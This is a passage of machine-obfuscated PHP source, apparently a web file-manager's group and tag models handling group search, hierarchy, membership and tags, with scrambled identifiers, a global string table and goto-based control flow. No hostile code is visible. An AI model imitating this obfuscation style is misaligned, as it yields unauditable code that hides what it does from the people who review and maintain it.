$_SERVER[ÒÆ›ÆØÎ¾]; $bÔñÅáàìÊ = $fÊ§İÉÍ˜µ[$Fëõº¦­Õ[1764]]; $aÇâæ³ô×Ò = isset($fÊ§İÉÍ˜µ[$Fëõº¦­Õ[1765]]) ? $fÊ§İÉÍ˜µ[$Fëõº¦­Õ[1765]] : !1; goto Cô‘³ØÔçâ; Cô‘³ØÔçâ: if (!trim($bÔñÅáàìÊ)) { return !1; } $bÔñÅáàìÊ = str_replace($Fëõº¦­Õ[1766], $Fëõº¦­Õ[1767], $bÔñÅáàìÊ); $Eº¨·‚‚© = array($Fëõº¦­Õ[1681] => array($Fëõº¦­Õ[380], "{$bÔñÅáàìÊ}\x25"), $Fëõº¦­Õ[28] => array($Fëõº¦­Õ[380], "\x25{$bÔñÅáàìÊ}\45"), $Fëõº¦­Õ[948] => $Fëõº¦­Õ[1768]); goto BÂ’†‚†Êá; F©ÆÍÙ: return $B¸Úç‚Íõˆ; goto AÒ­Ê„•‡; Bİ³¬Ó‚¨: $B¸Úç‚Íõˆ = $B¸Úç‚Íõˆ ? $B¸Úç‚Íõˆ : array($Fëõº¦­Õ[367] => array(), $Fëõº¦­Õ[364] => array()); if (!$B¸Úç‚Íõˆ || count($B¸Úç‚Íõˆ[$Fëõº¦­Õ[367]]) < 5 && Input::check($bÔñÅáàìÊ, $Fëõº¦­Õ[316])) { goto dãÊÏŠÇÀ³; B½©„ËŠœ£: $B¸Úç‚Íõˆ[$Fëõº¦­Õ[364]][$Fëõº¦­Õ[366]] = ceil($B¸Úç‚Íõˆ[$Fëõº¦­Õ[364]][$Fëõº¦­Õ[365]] / $B¸Úç‚Íõˆ[$Fëõº¦­Õ[364]][$Fëõº¦­Õ[361]]); goto DØœøĞè´; dãÊÏŠÇÀ³: $a†¶©­Â„ = $this->groupChildrenAll($aÇâæ³ô×Ò); $b‡‘‘éğ = $this->_searchFromMeta($Fëõº¦­Õ[443], $bÔñÅáàìÊ, 10, $a†¶©­Â„); $Bù–é±á£Ú = $this->_searchFromMeta($Fëõº¦­Õ[444], $bÔñÅáàìÊ, 10, $a†¶©­Â„); goto FŒøµ°õñ; FŒøµ°õñ: $dÅ†÷Ïª¬ô = array_merge($b‡‘‘éğ, $Bù–é±á£Ú, $B¸Úç‚Íõˆ[$Fëõº¦­Õ[367]]); $B¸Úç‚Íõˆ[$Fëõº¦­Õ[367]] = array_unique_by_key($dÅ†÷Ïª¬ô, $Fëõº¦­Õ[1681]); $B¸Úç‚Íõˆ[$Fëõº¦­Õ[364]][$Fëõº¦­Õ[365]] = count($B¸Úç‚Íõˆ[$Fëõº¦­Õ[367]]); goto B½©„ËŠœ£; DØœøĞè´: } $this->_listDataApply($B¸Úç‚Íõˆ[$Fëõº¦­Õ[367]]); goto F©ÆÍÙ; AÒ­Ê„•‡: } protected function groupChildrenAll($C¯‚‚ÅÒØÈ) { $f¬Úš•¢Ù¯ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$C¯‚‚ÅÒØÈ) { return !1; } if (is_string($C¯‚‚ÅÒØÈ)) { $C¯‚‚ÅÒØÈ = array($C¯‚‚ÅÒØÈ); } $D¯ƒ§‘†³ç = $C¯‚‚ÅÒØÈ; foreach ($C¯‚‚ÅÒØÈ as $BòİÔ——²) { $C‡’ˆó­¿… = $this->getInfoSimple($BòİÔ——²); $Aç‘Ş§¶ÆÂ = array($f¬Úš•¢Ù¯[487] => array($f¬Úš•¢Ù¯[380], $C‡’ˆó­¿…[$f¬Úš•¢Ù¯[487]] . $BòİÔ——² . $f¬Úš•¢Ù¯[513])); $AïÖğÈÈ›µ = $this->field($f¬Úš•¢Ù¯[1681])->where($Aç‘Ş§¶ÆÂ)->select(); $D¯ƒ§‘†³ç = array_merge($D¯ƒ§‘†³ç, array_to_keyvalue($AïÖğÈÈ›µ, $f¬Úš•¢Ù¯[33], $f¬Úš•¢Ù¯[1681])); } return array_unique($D¯ƒ§‘†³ç); } private function _searchFromMeta($C‚¡³Ğ¶ˆ, $eĞÎŸ» «, $eáÒ©âÍ„–, $bÄ®”¡ï) { goto E å¸å†Á£; F¯ƒ˜¯¦²¾: if (!$Fåàğô´àƒ) { return array(); } return $Fåàğô´àƒ; goto D…æ§çšÔ; E…‡£Ø•õ±: if (!$c•óÜÑõØ×) { return array(); } $c•óÜÑõØ× = array_to_keyvalue($c•óÜÑõØ×, $eÈáæùƒ¾ª[33], $eÈáæùƒ¾ª[1681]); $Fåàğô´àƒ = $this->where(array($eÈáæùƒ¾ª[1759] => array($eÈáæùƒ¾ª[7], $c•óÜÑõØ×)))->select(); goto F¯ƒ˜¯¦²¾; E å¸å†Á£: $eÈáæùƒ¾ª =& $_SERVER[ÒÆ›ÆØÎ¾]; $eĞÎŸ» « = strtolower($eĞÎŸ» «); $E­î‰‰èé¾ = array($eÈáæùƒ¾ª[93] => $C‚¡³Ğ¶ˆ, $eÈáæùƒ¾ª[372] => array($eÈáæùƒ¾ª[380], "\x25{$eĞÎŸ» «}\x25")); goto D°‚ñĞÚ; D°‚ñĞÚ: $E­î‰‰èé¾ = $this->parseWhereLike($E­î‰‰èé¾); if ($bÄ®”¡ï) { $E­î‰‰èé¾[$eÈáæùƒ¾ª[1681]] = array($eÈáæùƒ¾ª[7], $bÄ®”¡ï); } $c•óÜÑõØ× = Model($eÈáæùƒ¾ª[1769])->where($E­î‰‰èé¾)->limit($eáÒ©âÍ„–)->select(); goto E…‡£Ø•õ±; D…æ§çšÔ: } protected function _listDataApplyItem($aÂÎñî²Õ) { $Då ‚Æá = array($aÂÎñî²Õ); $this->_listDataApply($Då ‚Æá); return $Då ‚Æá[0]; } protected function _listDataApply(&$cØÍÜîÒ«) { goto Aå’ùŒ¿¾¶; Aå’ùŒ¿¾¶: $AÆéÛÌ–Â² =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$cØÍÜîÒ«) { return; } $cÉÇ”—Å„Ô = array_to_keyvalue($cØÍÜîÒ«, $AÆéÛÌ–Â²[33], $AÆéÛÌ–Â²[1681]); goto c¾Ä¡ÙÖ‘; F£è“ËƒÌÄ: $this->_listAppendParent($cØÍÜîÒ«); $this->_listAppendSourceRoot($cØÍÜîÒ«, $cÉÇ”—Å„Ô); goto bˆêÜº¯; c¾Ä¡ÙÖ‘: $this->_listAppendChildren($cØÍÜîÒ«); $this->_listAppendChildrenMember($cØÍÜîÒ«); $this->_listAppendMeta($cØÍÜîÒ«, $cÉÇ”—Å„Ô); goto F£è“ËƒÌÄ; bˆêÜº¯: } private function _listAppendChildren(&$F£†æ•ßŠß) { goto A®¢‚†’Õ; A®¢‚†’Õ: $cÃ‹Õ« …Ü =& $_SERVER[ÒÆ›ÆØÎ¾]; $B’Š‡ìøì = array_to_keyvalue($F£†æ•ßŠß, $cÃ‹Õ« …Ü[33], $cÃ‹Õ« …Ü[1681]); $F“œã—Ğ— = array($cÃ‹Õ« …Ü[478] => array($cÃ‹Õ« …Ü[7], $B’Š‡ìøì)); goto bÜ¹’Œ´Ş; bÜ¹’Œ´Ş: $ašÃ¢‹İ… = array($cÃ‹Õ« …Ü[478], $cÃ‹Õ« …Ü[1770] => $cÃ‹Õ« …Ü[480]); $C‡¬ß‹ñÀê = $this->field($ašÃ¢‹İ…)->where($F“œã—Ğ—)->group($cÃ‹Õ« …Ü[478])->select(); $Aí”’ƒ¡æ¹ = array_to_keyvalue($C‡¬ß‹ñÀê, $cÃ‹Õ« …Ü[478], $cÃ‹Õ« …Ü[480]); goto b‹Ø®êŞ…; b‹Ø®êŞ…: foreach ($F£†æ•ßŠß as &$BÖ­²­·Å) { $aÅ±Î¶¾ò· = $BÖ­²­·Å[$cÃ‹Õ« …Ü[1681]]; $BÖ­²­·Å[$cÃ‹Õ« …Ü[1771]] = isset($Aí”’ƒ¡æ¹[$aÅ±Î¶¾ò·]) ? intval($Aí”’ƒ¡æ¹[$aÅ±Î¶¾ò·]) : !1; } unset($BÖ­²­·Å); goto Bë¨¸½Ğí´; Bë¨¸½Ğí´: } private function _listAppendChildrenMember(&$A‘š–ãÈñ) { goto f»®«„ï‹; c¯Ëì™•°¢: $d±›á¯×Æ„ = array($e¯ÑŠªáœ[1681], $e¯ÑŠªáœ[1770] => $e¯ÑŠªáœ[480]); $CÓÅ‡×­µˆ = Model($e¯ÑŠªáœ[1762])->field($d±›á¯×Æ„)->where($aÕ÷ìå‰ô²)->group($e¯ÑŠªáœ[1681])->select(); $B¥öõÖÓ˜í = array_to_keyvalue($CÓÅ‡×­µˆ, $e¯ÑŠªáœ[1681], $e¯ÑŠªáœ[480]); goto e×¦î‰¡Â; f»®«„ï‹: $e¯ÑŠªáœ =& $_SERVER[ÒÆ›ÆØÎ¾]; $e¹œ«ËóƒĞ = array_to_keyvalue($A‘š–ãÈñ, $e¯ÑŠªáœ[33], $e¯ÑŠªáœ[1681]); $aÕ÷ìå‰ô² = array($e¯ÑŠªáœ[1681] => array($e¯ÑŠªáœ[7], $e¹œ«ËóƒĞ)); goto c¯Ëì™•°¢; e×¦î‰¡Â: foreach ($A‘š–ãÈñ as &$aÚĞô«Ì¶) { $d²ŠìÅ…¢¦ = $aÚĞô«Ì¶[$e¯ÑŠªáœ[1681]]; $aÚĞô«Ì¶[$e¯ÑŠªáœ[1772]] = isset($B¥öõÖÓ˜í[$d²ŠìÅ…¢¦]) ? intval($B¥öõÖÓ˜í[$d²ŠìÅ…¢¦]) : !1; } unset($aÚĞô«Ì¶); goto eôƒÜ“À¡ö; eôƒÜ“À¡ö: } private function _listAppendMeta(&$Då’……ºĞä, $e¢©îÌà‰¸) { goto f¼Ìø›•Š; f¼Ìø›•Š: $c‘ˆğƒå‰Î =& $_SERVER[ÒÆ›ÆØÎ¾]; $fË¯¨Œ˜ = array($c‘ˆğƒå‰Î[1681] => array($c‘ˆğƒå‰Î[7], $e¢©îÌà‰¸)); $d®ñà¡…¦ = Model($c‘ˆğƒå‰Î[1761])->where($fË¯¨Œ˜)->select(); goto b°…Ü³ç; b°…Ü³ç: $d®ñà¡…¦ = array_to_keyvalue_group($d®ñà¡…¦, $c‘ˆğƒå‰Î[1681]); foreach ($d®ñà¡…¦ as &$f×à¾Ê­³) { $f×à¾Ê­³ = array_to_keyvalue($f×à¾Ê­³, $c‘ˆğƒå‰Î[93], $c‘ˆğƒå‰Î[372]); } unset($f×à¾Ê­³); goto BÀ®£ŠÍ¡; BÀ®£ŠÍ¡: foreach ($Då’……ºĞä as &$fñá£ÀÕÖ) { $fñá£ÀÕÖ[$c‘ˆğƒå‰Î[445]] = array(); if (isset($d®ñà¡…¦[$fñá£ÀÕÖ[$c‘ˆğƒå‰Î[1681]]])) { $fñá£ÀÕÖ[$c‘ˆğƒå‰Î[445]] = $d®ñà¡…¦[$fñá£ÀÕÖ[$c‘ˆğƒå‰Î[1681]]]; } } unset($fñá£ÀÕÖ); goto D–Áğ½Ì³´; D–Áğ½Ì³´: } protected function parentLevelArray($fÓ‰é×ç‰¤) { $DÃÁØ’Œ”« =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÓ‰é×ç‰¤ = explode($DÃÁØ’Œ”«[47], trim($fÓ‰é×ç‰¤, $DÃÁØ’Œ”«[47])); $fÓ‰é×ç‰¤ = array_remove_value($fÓ‰é×ç‰¤, $DÃÁØ’Œ”«[191]); return $fÓ‰é×ç‰¤; } private function _listAppendParent(&$bä¹òö¹ï³) { goto F‡´‡ô‘˜Ú; E³éó­‘õ: if ($GLOBALS[$a‚…‰¹±±Ò[485]] == $a‚…‰¹±±Ò[87]) { $e‚Ä®Ô­ƒ = !1; } foreach ($bä¹òö¹ï³ as &$b´Ö˜ÁÒª) { $b±‹µ‹Õ¢ó = $this->parentLevelArray($b´Ö˜ÁÒª[$a‚…‰¹±±Ò[487]]); $AÄù˜„İ¿¼ = $a‚…‰¹±±Ò[33]; foreach ($b±‹µ‹Õ¢ó as $dø–¿­áÅ => $C„å¸Ì‡×Œ) { if ($e‚Ä®Ô­ƒ && $dø–¿­áÅ == 0) { continue; } $AÄù˜„İ¿¼ .= $EºÉÙí¶‚å[$C„å¸Ì‡×Œ] . $a‚…‰¹±±Ò[8]; } if ($b±‹µ‹Õ¢ó) { $AÄù˜„İ¿¼ .= $b´Ö˜ÁÒª[$a‚…‰¹±±Ò[28]]; } $b´Ö˜ÁÒª[$a‚…‰¹±±Ò[491]] = str_replace($a‚…‰¹±±Ò[496], $a‚…‰¹±±Ò[8], $AÄù˜„İ¿¼); } unset($b´Ö˜ÁÒª); goto C‡ÆÄ‡æ °; F‡´‡ô‘˜Ú: $a‚…‰¹±±Ò =& $_SERVER[ÒÆ›ÆØÎ¾]; $EºÉÙí¶‚å = array(); foreach ($bä¹òö¹ï³ as &$b´Ö˜ÁÒª) { $EºÉÙí¶‚å[$b´Ö˜ÁÒª[$a‚…‰¹±±Ò[1681]]] = $b´Ö˜ÁÒª[$a‚…‰¹±±Ò[28]]; $b±‹µ‹Õ¢ó = $this->parentLevelArray($b´Ö˜ÁÒª[$a‚…‰¹±±Ò[487]]); foreach ($b±‹µ‹Õ¢ó as $C„å¸Ì‡×Œ) { if (!isset($EºÉÙí¶‚å[$C„å¸Ì‡×Œ])) { $EºÉÙí¶‚å[$C„å¸Ì‡×Œ] = 0; } } } goto C‰Œªƒ…å; C‰Œªƒ…å: unset($b´Ö˜ÁÒª); foreach ($EºÉÙí¶‚å as $dø–¿­áÅ => $cæì­§²Õ) { if ($cæì­§²Õ) { continue; } $b­Á„“ºÓĞ = $this->getInfoSimple($dø–¿­áÅ); $EºÉÙí¶‚å[$dø–¿­áÅ] = $b­Á„“ºÓĞ[$a‚…‰¹±±Ò[28]]; } $e‚Ä®Ô­ƒ = $GLOBALS[$a‚…‰¹±±Ò[6]][$a‚…‰¹±±Ò[88]][$a‚…‰¹±±Ò[1773]]; goto E³éó­‘õ; C‡ÆÄ‡æ °: } private function _listAppendSourceRoot(&$fÑÍ‚¾³´Ê, $ağ°ˆ«Õç) { goto d‘Á•éÍé‰; f¥ìò«‰Ù»: $d‰íé‚¥ÀĞ = Model($DÛ„Ô¨ø½—[782])->order($DÛ„Ô¨ø½—[1775])->field($aÉ–·é¡©)->where($eàÛÇŞ¾—)->select(); $d‰íé‚¥ÀĞ = array_to_keyvalue($d‰íé‚¥ÀĞ, $DÛ„Ô¨ø½—[484]); $d‰íé‚¥ÀĞ = array_remove_key($d‰íé‚¥ÀĞ, $DÛ„Ô¨ø½—[484]); goto CîÅší êª; CîÅší êª: foreach ($fÑÍ‚¾³´Ê as &$a‡¢›çîç‡) { $a‡¢›çîç‡[$DÛ„Ô¨ø½—[85]] = $d‰íé‚¥ÀĞ[$a‡¢›çîç‡[$DÛ„Ô¨ø½—[1681]]] ? $d‰íé‚¥ÀĞ[$a‡¢›çîç‡[$DÛ„Ô¨ø½—[1681]]] : array(); } unset($a‡¢›çîç‡); goto cµô‚ˆÊ“ã; d‘Á•éÍé‰: $DÛ„Ô¨ø½— =& $_SERVER[ÒÆ›ÆØÎ¾]; $eàÛÇŞ¾— = array($DÛ„Ô¨ø½—[404] => SourceModel::TYPE_GROUP, $DÛ„Ô¨ø½—[478] => 0, $DÛ„Ô¨ø½—[484] => array($DÛ„Ô¨ø½—[7], $ağ°ˆ«Õç)); $aÉ–·é¡© = $DÛ„Ô¨ø½—[1774]; goto f¥ìò«‰Ù»; cµô‚ˆÊ“ã: } protected function groupMerge($c°õİÙÖ¥) { $c°õİÙÖ¥ = array_values(array_unique($c°õİÙÖ¥)); $EÁªö’ˆ–ï = array(); for ($FØÍƒÛ—É = 0; $FØÍƒÛ—É < count($c°õİÙÖ¥); $FØÍƒÛ—É++) { $d›ßµŒ®Ê¹ = !1; for ($EÄùíÄó… = 0; $EÄùíÄó… < count($c°õİÙÖ¥); $EÄùíÄó…++) { if ($FØÍƒÛ—É == $EÄùíÄó…) { continue; } if ($this->isParentOf($c°õİÙÖ¥[$EÄùíÄó…], $c°õİÙÖ¥[$FØÍƒÛ—É])) { $d›ßµŒ®Ê¹ = !0; break; } } if (!$d›ßµŒ®Ê¹) { $EÁªö’ˆ–ï[] = $c°õİÙÖ¥[$FØÍƒÛ—É]; } } return $EÁªö’ˆ–ï; } protected function isParentOf($CßùˆŒ§š„, $b•”°ÁÊÃ¤) { goto AŠÀßËä´„; AŠÀßËä´„: $c¨âíÒª‚ˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$CßùˆŒ§š„ || !$b•”°ÁÊÃ¤ || $CßùˆŒ§š„ == $b•”°ÁÊÃ¤) { return !1; } $B¶–Ë…’ß™ = $this->getInfoSimple($CßùˆŒ§š„); goto Cââ ¾¢ï©; Cââ ¾¢ï©: $C†ÄÙ¦ª¡¯ = $this->getInfoSimple($b•”°ÁÊÃ¤); $CÃ¯±ŸêÇÕ = $B¶–Ë…’ß™[$c¨âíÒª‚ˆ[487]] . $CßùˆŒ§š„ . $c¨âíÒª‚ˆ[47]; if (substr($C†ÄÙ¦ª¡¯[$c¨âíÒª‚ˆ[487]], 0, strlen($CÃ¯±ŸêÇÕ)) == $CÃ¯±ŸêÇÕ) { return !0; } goto eèÊæéö±™; eèÊæéö±™: return !1; goto e‹ÛßÍ›âÇ; e‹ÛßÍ›âÇ: } public function groupShowRoot($cÓÉÁ¹ĞÖ, $FËµ²™‘öö = false) { goto BµÈÖÕµ†ğ; BµÈÖÕµ†ğ: $cä¸ìÃÊ£ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b†Â‰Ñ¹—À = $this->getInfo($cÓÉÁ¹ĞÖ); if (!$b†Â‰Ñ¹—À) { return array(); } goto b©é«®Ûâõ; b©é«®Ûâõ: $eéÀ½Ú· — = $this->parentLevelArray($b†Â‰Ñ¹—À[$cä¸ìÃÊ£[487]]); $bÔ†ìÒõœ¿ = array($cÓÉÁ¹ĞÖ); if (count($eéÀ½Ú· —) == 0) { return $bÔ†ìÒõœ¿; } goto dŒœæÀÁÌÓ; f­¨ººÃÕğ: return $bÔ†ìÒõœ¿; goto Cß´§Ò´š; dŒœæÀÁÌÓ: if ($FËµ²™‘öö && count($eéÀ½Ú· —) == 1) { return $bÔ†ìÒõœ¿; } if (!$b†Â‰Ñ¹—À[$cä¸ìÃÊ£[445]] || !isset($b†Â‰Ñ¹—À[$cä¸ìÃÊ£[445]][$cä¸ìÃÊ£[1757]]) || $b†Â‰Ñ¹—À[$cä¸ìÃÊ£[445]][$cä¸ìÃÊ£[1757]] == $cä¸ìÃÊ£[1731]) { return $this->groupShowRoot($eéÀ½Ú· —[count($eéÀ½Ú· —) - 1], $FËµ²™‘öö); } if ($b†Â‰Ñ¹—À[$cä¸ìÃÊ£[445]][$cä¸ìÃÊ£[1757]] == $cä¸ìÃÊ£[357]) { $E†ÅÇÙµƒà = explode($cä¸ìÃÊ£[47], $b†Â‰Ñ¹—À[$cä¸ìÃÊ£[445]][$cä¸ìÃÊ£[1758]]); if ($E†ÅÇÙµƒà) { $bÔ†ìÒõœ¿ = array_merge($bÔ†ìÒõœ¿, $E†ÅÇÙµƒà); } } goto f­¨ººÃÕğ; Cß´§Ò´š: } protected function resetParentLevel() { $dÉ»É¾Ü¯ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D›ê‡ŒÔ”¯ = $dÉ»É¾Ü¯[1681]; $c¨ÌŠ„™„Á = $this->select(); $c¨ÌŠ„™„Á = array_to_keyvalue($c¨ÌŠ„™„Á, $D›ê‡ŒÔ”¯); foreach ($c¨ÌŠ„™„Á as $F„Ğ¢¥Ğ­) { goto f™Ó‰¼È§¶; bÌ‚ä’Ò‹À: $this->where(array($D›ê‡ŒÔ”¯ => $F„Ğ¢¥Ğ­[$D›ê‡ŒÔ”¯]))->save(array($dÉ»É¾Ü¯[553] => $C×Ôˆ¬ –ä)); goto B¨ÔÕß‘¯¹; f™Ó‰¼È§¶: $dÖíœãÜƒÀ = $F„Ğ¢¥Ğ­; $C×Ôˆ¬ –ä = array(); while ($dÖíœãÜƒÀ[$dÉ»É¾Ü¯[478]] != 0) { $C×Ôˆ¬ –ä[] = $dÖíœãÜƒÀ[$dÉ»É¾Ü¯[478]]; $dÖíœãÜƒÀ = $c¨ÌŠ„™„Á[$dÖíœãÜƒÀ[$dÉ»É¾Ü¯[478]]]; } goto f¼™ÃÏ—ŞÖ; f¼™ÃÏ—ŞÖ: $C×Ôˆ¬ –ä[] = 0; $C×Ôˆ¬ –ä = $dÉ»É¾Ü¯[47] . implode($dÉ»É¾Ü¯[47], array_reverse($C×Ôˆ¬ –ä)) . $dÉ»É¾Ü¯[47]; $this->setNamePinyin($F„Ğ¢¥Ğ­[$D›ê‡ŒÔ”¯], $F„Ğ¢¥Ğ­[$dÉ»É¾Ü¯[28]]); goto bÌ‚ä’Ò‹À; B¨ÔÕß‘¯¹: } return $c¨ÌŠ„™„Á; } public function groupNameAuto($C†ÅÂÍæµ±, $FíÂêò¯˜„) { $AòŠ¸„öÅ¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Eß¦âùÏİ = $this->where(array($AòŠ¸„öÅ¶[394] => $C†ÅÂÍæµ±))->getField($AòŠ¸„öÅ¶[28], !0); if (!$Eß¦âùÏİ || !in_array($FíÂêò¯˜„, $Eß¦âùÏİ)) { return $FíÂêò¯˜„; } for ($AÚ¤ŠÅ‚ë = 1; $AÚ¤ŠÅ‚ë <= count($Eß¦âùÏİ) + 1; $AÚ¤ŠÅ‚ë++) { $b§®‘ÇÛÆ = $FíÂêò¯˜„ . "\50{$AÚ¤ŠÅ‚ë}\51"; if (!in_array($b§®‘ÇÛÆ, $Eß¦âùÏİ)) { return $b§®‘ÇÛÆ; } } } public function groupSwitch($C«èò —¿í, $A°÷Ç„‡) { goto d·¥á¢©ËŸ; a¼©óÍ¶‹Ÿ: $CŠ§İ¯…˜ó = !empty($Cæ¨àôœ[$C«èò —¿í]) ? $Cæ¨àôœ[$C«èò —¿í] : !1; if ($CŠ§İ¯…˜ó) { goto b®ò„Ä„‹×; EŞ£ÅëÃˆŒ: foreach ($Cæ¨àôœ as $A´‡…íÔ½•) { $e„×¦ì»‡ = $A´‡…íÔ½•[$E¦¤¬ğ‚´§[403]] == $E¦¤¬ğ‚´§[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($E¦¤¬ğ‚´§[782])->move($A´‡…íÔ½•[$E¦¤¬ğ‚´§[395]], $E”Æ—ˆÕ§®, $e„×¦ì»‡); } Model($E¦¤¬ğ‚´§[782])->moveClearAuth = !0; $FÁ‘²„ÙÚ” = array($E¦¤¬ğ‚´§[404] => 2, $E¦¤¬ğ‚´§[484] => $C«èò —¿í); goto fÔ·İò—È; F’Æ÷ÀÛºÌ: $Cæ¨àôœ = Model($E¦¤¬ğ‚´§[782])->where($FÁ‘²„ÙÚ”)->field($E¦¤¬ğ‚´§[1778])->select(); if (!$Cæ¨àôœ) { $Cæ¨àôœ = array(); } Model($E¦¤¬ğ‚´§[782])->moveClearAuth = !1; goto EŞ£ÅëÃˆŒ; fÔ·İò—È: $dŒ„ñ­«ï£ = array($E¦¤¬ğ‚´§[484] => $A°÷Ç„‡); Model($E¦¤¬ğ‚´§[1779])->where($FÁ‘²„ÙÚ”)->save($dŒ„ñ­«ï£); Model($E¦¤¬ğ‚´§[1780])->where($FÁ‘²„ÙÚ”)->save($dŒ„ñ­«ï£); goto B½ñÑ¸ğË‹; b®ò„Ä„‹×: if (!$Cæ¨àôœ[$A°÷Ç„‡]) { $Cæ¨àôœ[$A°÷Ç„‡] = Model($E¦¤¬ğ‚´§[782])->groupRootAdd($A°÷Ç„‡); } $E”Æ—ˆÕ§® = $Cæ¨àôœ[$A°÷Ç„‡]; $FÁ‘²„ÙÚ” = array($E¦¤¬ğ‚´§[478] => $CŠ§İ¯…˜ó); goto F’Æ÷ÀÛºÌ; B½ñÑ¸ğË‹: } $this->_changeChildLevel($e‰¤ùäà•„[$C«èò —¿í], $e‰¤ùäà•„[$A°÷Ç„‡], !0); goto d…˜È‚³Ÿ¹; d·¥á¢©ËŸ: $E¦¤¬ğ‚´§ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÁ‘²„ÙÚ” = array($E¦¤¬ğ‚´§[1681] => array($E¦¤¬ğ‚´§[7], array($C«èò —¿í, $A°÷Ç„‡))); $e‰¤ùäà•„ = $this->where($FÁ‘²„ÙÚ”)->select(); goto AÔº»­”Ò­; AÔº»­”Ò­: $e‰¤ùäà•„ = array_to_keyvalue($e‰¤ùäà•„, $E¦¤¬ğ‚´§[1681]); if (!isset($e‰¤ùäà•„[$C«èò —¿í]) || !isset($e‰¤ùäà•„[$A°÷Ç„‡]) || $e‰¤ùäà•„[$C«èò —¿í][$E¦¤¬ğ‚´§[478]] == 0) { return !1; } $FÁ‘²„ÙÚ” = array($E¦¤¬ğ‚´§[1681] => $C«èò —¿í); goto CÉ©ìÖÄî; d…˜È‚³Ÿ¹: $this->where(array($E¦¤¬ğ‚´§[478] => $C«èò —¿í))->save(array($E¦¤¬ğ‚´§[478] => $A°÷Ç„‡)); return !0; goto cÂù•¾Áº¥; dÄ®­Ìö: $FÁ‘²„ÙÚ” = array($E¦¤¬ğ‚´§[404] => 2, $E¦¤¬ğ‚´§[478] => 0, $E¦¤¬ğ‚´§[403] => 1, $E¦¤¬ğ‚´§[484] => array($E¦¤¬ğ‚´§[7], array($C«èò —¿í, $A°÷Ç„‡))); $Cæ¨àôœ = Model($E¦¤¬ğ‚´§[782])->where($FÁ‘²„ÙÚ”)->field($E¦¤¬ğ‚´§[1777])->select(); $Cæ¨àôœ = array_to_keyvalue($Cæ¨àôœ, $E¦¤¬ğ‚´§[484], $E¦¤¬ğ‚´§[395]); goto a¼©óÍ¶‹Ÿ; CÉ©ìÖÄî: $EİÍ¯œ—…„ = Model($E¦¤¬ğ‚´§[1762])->where($FÁ‘²„ÙÚ”)->select(); if (!$EİÍ¯œ—…„) { $EİÍ¯œ—…„ = array(); } foreach ($EİÍ¯œ—…„ as $bã‰¹ÏˆÆ•) { $Dóš½Ûğê· = $bã‰¹ÏˆÆ•[$E¦¤¬ğ‚´§[1517]]; $FÁ‘²„ÙÚ” = array($E¦¤¬ğ‚´§[1517] => $Dóš½Ûğê·, $E¦¤¬ğ‚´§[1681] => $A°÷Ç„‡); $cøÖåèºîğ = Model($E¦¤¬ğ‚´§[1762])->where($FÁ‘²„ÙÚ”)->find(); if (!$cøÖåèºîğ) { $dè˜ªÖ‘¡ = array($A°÷Ç„‡ => $bã‰¹ÏˆÆ•[$E¦¤¬ğ‚´§[1776]]); Model($E¦¤¬ğ‚´§[506])->userGroupAdd($Dóš½Ûğê·, $dè˜ªÖ‘¡); } Model($E¦¤¬ğ‚´§[506])->userGroupRemove($Dóš½Ûğê·, $C«èò —¿í); } goto dÄ®­Ìö; cÂù•¾Áº¥: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\x66\x61\166"; protected function cacheFunctionAlias($E ä¸ê¾Şº) { $Eåìè ¡™§ =& $_SERVER[ÒÆ›ÆØÎ¾]; return array($Eåìè ¡™§[1781] => array($E ä¸ê¾Şº[0], $Eåìè ¡™§[1782]), $Eåìè ¡™§[1783] => array($E ä¸ê¾Şº[0], $Eåìè ¡™§[1784])); } protected function get($fÉäßœ±ìŠ) { $F×òî°à– =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÒ¡À‘õÄš = Model($F×òî°à–[486])->metaGet($fÉäßœ±ìŠ, $F×òî°à–[1785]); $BĞï…Š±­É = json_decode($dÒ¡À‘õÄš, !0); return $BĞï…Š±­É ? $BĞï…Š±­É : array($F×òî°à–[1786] => $F×òî°à–[87], $F×òî°à–[367] => array()); } protected function set($A¡æååî£ö, $Dêó˜‘Ü²¡) { $eèİ­À‹ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dêó˜‘Ü²¡ = $Dêó˜‘Ü²¡ ? $Dêó˜‘Ü²¡ : array($eèİ­À‹[1786] => $eèİ­À‹[87], $eèİ­À‹[367] => array()); Model($eèİ­À‹[486])->metaSet($A¡æååî£ö, $eèİ­À‹[1785], json_encode($Dêó˜‘Ü²¡)); return Model($eèİ­À‹[486])->metaSet($A¡æååî£ö, $eèİ­À‹[1785], json_encode($Dêó˜‘Ü²¡)); } protected function getByTagID($cºä¾œîÎ, $bÚ­ÚôÆ‘‡) { goto EŠÓ„ã›ƒ; EŠÓ„ã›ƒ: $b¥Ü«ø°Ä– =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$cºä¾œîÎ || !$bÚ­ÚôÆ‘‡) { return !1; } if (!Model($b¥Ü«ø°Ä–[486])->getInfoSimple($cºä¾œîÎ)) { return !1; } goto BÆìç·Œ˜Ã; BÆìç·Œ˜Ã: $FŠ¯æÒ§Ğ‚ = $this->get($cºä¾œîÎ); if (!$FŠ¯æÒ§Ğ‚ || !isset($FŠ¯æÒ§Ğ‚[$b¥Ü«ø°Ä–[367]])) { return !1; } $dß¦¯àô = array_find_by_field($FŠ¯æÒ§Ğ‚[$b¥Ü«ø°Ä–[367]], $b¥Ü«ø°Ä–[393], $bÚ­ÚôÆ‘‡); goto Dİëñ•’é; Dİëñ•’é: return is_array($dß¦¯àô) ? $dß¦¯àô : !1; goto C¿µôÑîˆ©; C¿µôÑîˆ©: } public function listSource($d‰Ì¦ñ¬Ú, $bß®ì×„’) { goto aÜµÇ·ˆÕÏ; cñéÆ©ˆ†¹: $f®åæ¥ Ó× = array_to_keyvalue($Bëâ´”—ê[$f·Äˆ’æƒÄ[75]], $f·Äˆ’æƒÄ[33], $f·Äˆ’æƒÄ[395]); $D‰ ·¯°ª¾ = array_to_keyvalue($Bëâ´”—ê[$f·Äˆ’æƒÄ[74]], $f·Äˆ’æƒÄ[33], 